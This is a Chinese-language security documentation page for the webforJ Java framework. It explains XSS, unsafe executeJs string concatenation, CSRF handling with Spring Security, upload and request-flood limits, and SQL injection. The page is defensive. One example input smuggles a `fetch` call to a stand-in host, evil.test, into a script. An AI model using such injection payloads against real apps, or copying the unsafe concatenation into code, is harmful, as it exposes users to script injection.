---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
因为 webforJ 应用程序在服务器上运行 Java，而浏览器只呈现界面（请参阅 [Client/Server Interaction](/docs/architecture/client-server) 文章），因此几类攻击在设计上被遏制。其他的仍然取决于您编写代码的方式。本页将逐步介绍最重要的威胁，并明确界定 webforJ 处理的内容与您需要处理的内容之间的界限。

## 跨站脚本（XSS） {#cross-site-scripting-xss}

当一个本应作为文本显示的字符串被浏览器解释为实时标记时，跨站脚本（XSS）攻击就会成功。webforJ 默认关闭这种情况：当您设置组件的文本时，其值被逐字显示，因此其中的标签作为字符出现，永远不会执行。

```java
// 作为字面字符 "<b>hi</b>" 显示
component.setText("<b>hi</b>");
```

渲染真实的标记是一个单独的、故意的步骤。webforJ 仅在值被 `<html>...</html>` 包裹时将其视为标记，这正是 `HasHtml` 关注点的 `setHtml` 方法在您背后所做的工作。以任何其他方式设置的值都会首先被简化为纯文本。

```java
// 故意渲染为标记
component.setHtml("<b>hi</b>");
```

:::danger 您选择的标记不会被自动清理
框架不会清理您包裹在 `<html>` 中的标记。只要该标记的任何片段来源于个人、存储记录、查询字符串或您无法完全控制的任何其他来源，您都需要在它到达组件之前自己清理。使用维护好的清理器，如 [jsoup](https://jsoup.org/) 或 [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/)，并给予它您实际打算允许的标签的允许列表。
:::

### 执行 JavaScript {#executing-javascript}

同样的规则也适用于您使用 `executeJs` 及其异步变体在客户端运行的脚本（<JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink> API）。`executeJs` 运行您提供的字符串作为程序，因此任何包含在该字符串中的内容都是浏览器执行的，包括您从不受信任的值中拼接进来的内容。

```java
// 危险：该值被嵌入到程序文本中
el.executeJs("greet('" + name + "')");
```

如果 `name` 包含 `'); fetch('https://evil.test'); ('`，浏览器则执行以下程序：

```js
greet(''); fetch('https://evil.test'); ('')
```

攻击者的 `fetch` 现在成为您程序中的一条语句，因此会执行。拼接使输入成为了 *代码的一部分*。

确保完全不将不受信任的值放入脚本中。将值作为数据发送到客户端，设置到元素上，然后运行一个固定的脚本通过 `component` 关键字读取它：

```java
// 安全：该值是脚本读取的数据，永不作为代码执行
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

在这里，浏览器运行的程序始终只是 `greet(component.greetName)`。其中没有需要解析的不受信任的输入。该值位于一个属性中，读取字符串值永远不会执行它，因此同样的 `name` 被作为文本传递给 `greet` 而不是作为代码执行。

## 跨站请求伪造（CSRF） {#cross-site-request-forgery-csrf}

跨站请求伪造（CSRF）攻击会欺骗已登录用户的浏览器发送用户从未意图的操作。webforJ 默认阻止其自身流量中的这种情况，无需任何设置：该框架仅信任属于当前用户会话的请求，因此其他来源的页面无法代表用户驱动应用程序。

这在确切的一个情况下变得明显。[Spring Security](/docs/security/getting-started) 为每个请求启用其自己的伪造请求保护，并且无法识别 webforJ 的通道，因此会拒绝该框架的流量，应用程序将无法加载。webforJ Spring 集成为您解决了这个问题：<JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> 告诉 Spring 跳过对 webforJ 的框架请求的验证。这是安全的，因为框架已经自行保护了这些请求，因此没有任何内容处于无保护状态。

:::info 自定义 Spring 配置
如果您在没有 `webforj()` 帮助程序的情况下组装 `SecurityFilterChain`，请自行排除 Spring 验证中的框架请求，并将该验证保持开启以适用于您添加的任何端点。
:::

## 不限制文件上传 {#unbounded-file-uploads}

接受任何大小或数量的文件会导致内存、磁盘或带宽的拒绝服务。限制您在上传组件上接受的内容：它们公开 `setMaxFileSize()` 来限制每个文件的大小，以及 `setMaxFiles()` 来限制一次上传多少文件。

将其视为第一道防线，而不是唯一防线。浏览器端的限制可能被绕过，因此还要在服务器端强制限制：在您的 [configuration](/docs/configuration/properties) 中设置 `webforj.fileUpload.maxSize`，以在上传到达您的代码之前拒绝过大的文件，并在您的 servlet 容器或反向代理上限制最大请求大小。

## 请求洪水 {#request-flooding}

一个被操控的客户端也可以试图直接淹没服务器：发送一个非常大的单个请求，或快速启动新的应用程序会话，直到内存或其他资源耗尽。由于服务器驱动着每个应用程序，因此任一类型的洪水都直接到达它。

webforJ 可以限制这两者。设置 `webforj.security.maxContentLength` 来限制应用程序接受的请求大小（以字节为单位），并设置 `webforj.security.maxInitPerMinute` 来限制每分钟启动的新应用程序会话数量。两者的默认值均为 `0`，这表示禁用，因此对于任何面向不受信任流量的部署，您必须设置它们。请参阅 [Property Configuration](/docs/configuration/properties) 以获取详细信息。

与上传一样，将这些视为内部层，并在您的 servlet 容器或反向代理上限制请求大小。

## SQL 注入 {#sql-injection}

webforJ 不在您的数据层附近，因此对 SQL 注入的抵抗完全依赖于您的查询代码。使用参数化查询或预编译语句，以便值作为参数绑定，而不是拼接到语句中，并且绝不要通过将用户输入的字符串连接起来来构建查询。这是普通 JDBC 和持久层实践，适用于 webforJ 应用程序不会改变。
